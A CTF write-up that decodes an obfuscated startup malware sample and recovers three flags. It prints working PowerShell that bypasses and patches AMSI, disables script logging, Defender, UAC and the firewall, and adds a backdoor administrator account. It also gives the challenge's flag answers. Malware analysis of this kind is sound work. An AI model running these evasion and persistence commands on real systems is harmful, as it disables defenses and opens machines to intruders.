---

layout: post
title: "Huntress CTF 2025 - Spaghetti"
categories: writeup malware 
permalink: :categories/:title

---

## Challenge Description

> You know, I've been thinking... at the end of the day, spaghetti is really just strings of pasta!
>
   Anyway, we saw this weird file running on startup. Can you figure out what this is?
>
   I'm sure you'll get more understanding of the questions below as you explore!


---

## Thought process:

We are given 2 files:

`spaghetti` - spaghetti: Non-ISO extended-ASCII text, with CRLF line terminators
`AYGIW.tmp` -AYGIW.tmp: ASCII text, with very long lines (65536), with no line terminators

looking at `spaghetti` we find really obfuscated VBS Script.

When I saw this part of the script

```vbs
	[byte[]]$WULC4 = HombaAmigo($MainFileSettings.replace('WT','00'))
```

I rememberd that the `AYGIW.tmp` had a lot of  "WT"'s in it

i ran a simple command in terminal to replace all instances of "WT" with "00"

```bash
cat AYGIW.tmp | tr 'WT' '00'
```

And it looks like hex. So I went to cyberchef and pasted it and put recipe "From Hex"

First line looked promising:
```
MZ..........ÿÿ..¸.......@.........................................º..´    Í!¸.LÍ!This program cannot be run in DOS mode.
```

One google search later:
```
The DOS MZ executable format is the executable file format used for . EXE files in DOS. **The file can be identified by the ASCII string "MZ" (hexadecimal: 4D 5A) at the beginning of the file** (the "magic number"). "MZ" are the initials of Mark Zbikowski, one of the leading developers of MS-DOS.
```

So we use a little trick with command line with tool `xxd`

After running this command

```bash
cat AYGIW.tmp | tr 'WT' '00' | xxd -r -p > decoded

file decoded
decoded: PE32 executable for MS Windows 5.01 (GUI), Intel i386, 7 sections
```

Nice we got an executable. What is the first thing you do with every executable you get in a CTF challenge? 

Thats right you run [[strings]]  and [[grep]] for flag.

```bash
strings decoded | grep flag
flag{39544d3b5374ebf7d39b8c260fc4afd8}
```

We just got the 1st of three flags.

So lets continue analysing the `spaghetti` file

There are 2 big blobs of made with lots of `%` and `~` characters.

also we see this:

```vbs
Replace('~','0').Replace('%','1')))
$TDefo | .('{x}{9}'.replace('9','0').replace('x','1')-f'lun','%%').replace('%%','I').replace('lun','EX')
```

so it just converts it to binary?

Thats right and so we can recreate that with a simple python script that just replaces ~ with 0 and % with 1 and the to turn that binary to ascii.

## Solution(Python)
```python
def binary_to_ascii(binary_str):
    decoded_text = ''
    for i in range(0, len(binary_str), 8):
        byte = binary_str[i:i+8]
        if len(byte) == 8:
            decoded_text += chr(int(byte, 2))
    return decoded_text

# Extract the encoded string for $MyOasis4
encoded_my_oasis4 = "here is blob from $MyOasis4 = (FonatozQZ()"
encoded_tdefo = "here is blob from $TDefo = (FonatozQZ()"
binary_my_oasis4 = encoded_my_oasis4.replace('~', '0').replace('%', '1')
binary_tdefo = encoded_tdefo.replace('~', '0').replace('%', '1')
decoded_text = binary_to_ascii(binary_my_oasis4)
decoded_text += binary_to_ascii(binary_tdefo)
print(decoded_text)

```

### Output
```
start-sleep 23
# Disable Script Logging:
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")

# Matt Graebers Reflection method:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Forcing an error:
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)


start-sleep 12
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)


start-sleep 7


$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $ZQCUW

$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
# $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#102;&#108;&#97;&#103;&#123;&#98;&#51;&#49;&#51;&#55;&#57;&#52;&#100;&#99;&#101;&#102;&#51;&#51;&#53;&#100;&#97;&#54;&#50;&#48;&#54;&#100;&#53;&#52;&#97;&#102;&#56;&#49;&#98;&#54;&#50;&#48;&#51;&#125;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
--------------------------------------------------------------------------------
Decoded string (2681 chars):
Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".ppam"
Add-MpPreference -ExclusionExtension ".xls"
Add-MpPreference -ExclusionExtension ".bat"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionExtension ".vbs"
Add-MpPreference -ExclusionExtension ".js"
Add-MpPreference -ExclusionPath  C:\
Add-MpPreference -ExclusionPath  D:\
Add-MpPreference -ExclusionPath  E:\
Add-MpPreference -ExclusionPath  C:\ProgramData\MEMEMAN\
# Add-MpPreference -ExclusionExtension "flag{60814731f508781b9a5f8636c817af9d}"
Add-MpPreference -ExclusionProcess explorer.exe
Add-MpPreference -ExclusionProcess kernel32.dll
Add-MpPreference -ExclusionProcess aspnet_compiler.exe
Add-MpPreference -ExclusionProcess cvtres.exe
Add-MpPreference -ExclusionProcess CasPol.exe
Add-MpPreference -ExclusionProcess csc.exe
Add-MpPreference -ExclusionProcess Msbuild.exe
Add-MpPreference -ExclusionProcess ilasm.exe
Add-MpPreference -ExclusionProcess InstallUtil.exe
Add-MpPreference -ExclusionProcess jsc.exe
Add-MpPreference -ExclusionProcess Calc.exe
Add-MpPreference -ExclusionProcess powershell.exe
Add-MpPreference -ExclusionProcess rundll32.exe
Add-MpPreference -ExclusionProcess mshta.exe
Add-MpPreference -ExclusionProcess cmd.exe
Add-MpPreference -ExclusionProcess DefenderisasuckingAntivirus
Add-MpPreference -ExclusionProcess wscript.exe
Add-MpPreference -ExclusionIpAddress 127.0.0.1
Add-MpPreference -ThreatIDDefaultAction_Actions 6
Add-MpPreference -AttackSurfaceReductionRules_Ids 0
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -PUAProtection disable
Set-MpPreference -HighThreatDefaultAction 6 -Force
Set-MpPreference -ModerateThreatDefaultAction 6
Set-MpPreference -LowThreatDefaultAction 6
Set-MpPreference -SevereThreatDefaultAction 6
Set-MpPreference -ScanScheduleDay 8
New-Ipublicroperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
Stop-Service -Name WinDefend -Confirm:$false -Force
Set-Service -Name WinDefend -StartupType Disabled
net user System32 /add
net user System32 123
net localgroup administrators System32 /add
net localgroup "Remote Desktop Users" System32 /add
net stop WinDefend
net stop WdNisSvc
sc delete windefend
netsh advfirewall set allprofiles state off
```

Look there it is another easy flag: `flag{60814731f508781b9a5f8636c817af9d}`


One more to go.

While looking at this output one thing caught my eye:
```
$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
# $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#102;&#108;&#97;&#103;&#123;&#98;&#51;&#49;&#51;&#55;&#57;&#52;&#100;&#99;&#101;&#102;&#51;&#51;&#53;&#100;&#97;&#54;&#50;&#48;&#54;&#100;&#53;&#52;&#97;&#102;&#56;&#49;&#98;&#54;&#50;&#48;&#51;&#125;'))")
```

Html decode? Searching we see:

"HTML decoding is  the process of converting special character sequences, called HTML entities, back into their original, human-readable characters"

And there are many decoders online lets use one and only CyberChef

Inputing these:
```
&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;
&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;
&#102;&#108;&#97;&#103;&#123;&#98;&#51;&#49;&#51;&#55;&#57;&#52;&#100;&#99;&#101;&#102;&#51;&#51;&#53;&#100;&#97;&#54;&#50;&#48;&#54;&#100;&#53;&#52;&#97;&#102;&#56;&#49;&#98;&#54;&#50;&#48;&#51;&#125;
```

And choosing From HTML Entity Recipe we get:

```
amsi.dll
AmsiScanBuffer
flag{b313794dcef335da6206d54af81b6203}
```

And here is the 3rd and final flag.